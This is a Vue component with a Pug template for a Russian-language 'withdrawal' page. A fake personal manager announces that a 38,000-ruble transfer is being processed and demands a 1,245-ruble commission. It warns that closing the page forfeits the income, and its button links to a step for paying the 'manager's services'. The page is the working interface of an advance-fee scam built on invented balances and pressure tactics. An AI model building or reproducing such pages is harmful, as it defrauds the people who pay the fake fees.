<template lang='pug'>
    .step
        .step__top
            .step__top-left
                span.step__top-icon
                    user-icon(height="140")

            .step__top-right
                .step__top-heading УСПЕШНАЯ ОТПРАВКА ПЕРЕВОДА В ОБРАБОТКУ

                .step__top-desc Не покидайте страницу!!! Если вы закроете данную страницу, сессия будет завершена и Ваш доход утерян

                .step__top-t3 ЛИЧНЫЙ МЕНЕДЖЕР

                .step__top-msg(v-if="!msg.show") Менеджер печатает сообщение

                .step__top-t2(v-if="msg.show")
                    //- p Чтобы вам <span style="color: orange">отправили деньги</span> вручную, наймите личного менеджера. Менеджер будет каждый день самостоятельно <span style="color: orange">отправлять вам деньги</span> с вашего баланса. <span style="color: orange">Сразу после оплаты услуг менеджера, будет отправлен денежный перевод</span>.
                    p Здравствуйте. Меня зовут Андрей Ковалев. Я ваш личный менеджер. Ваш денежный перевод в сумме <span style="color: orange; font-weight: bold">38000</span> рублей я только что отправил в обработку. Вам осталось только <span style="color: orange">оплатить комиссию</span> за перевод средств, которая берет система массовых выплат.

        .step__bot
            .step__bot-header ВЫВОД СРЕДСТВ

            .step__bot-body
                ul.step__bot-balans.list
                    li.step__bot-account
                        span.step__bot-account-bg
                            img(src="~img/images/account-img.svg")

                        span.step__bot-account-title Счет№:

                        span.step__bot-account-value 1773569865 

                    li.step__bot-sum
                        span.step__bot-sum-bg
                            img(src="~img/images/coint-img.svg")

                        span.step__bot-sum-title Баланс счета:

                        span.step__bot-sum-value 37458 руб

                    li.step__bot-account
                        span.step__bot-account-bg
                            img(src="~img/images/percent-img.svg")

                        span.step__bot-account-title Комиссия 3,3%

                        span.step__bot-account-value 1245 руб

                p.step__bot-t1 Статус: <span class="orange"> Ожидаеться комиссия</span>

                p.step__bot-t2 Денежный перевод принят в обработку. <br />Оплатите комиссию за перевод денежных средств для <br />завершения транзакции.

                router-link.step__bot-submit.link(:to="{ name: 'thirdStep' }") ОПЛАТИТЬ УСЛУГИ МЕНЕДЖЕРА

                .step__bot-footer Сразу после оплаты комиссии, <br />вам будет отправлен перевод в сумме: 38000 руб.
</template>

<script src='./script.js'></script>

<style lang='scss' src='../firstStep/style.scss'></style>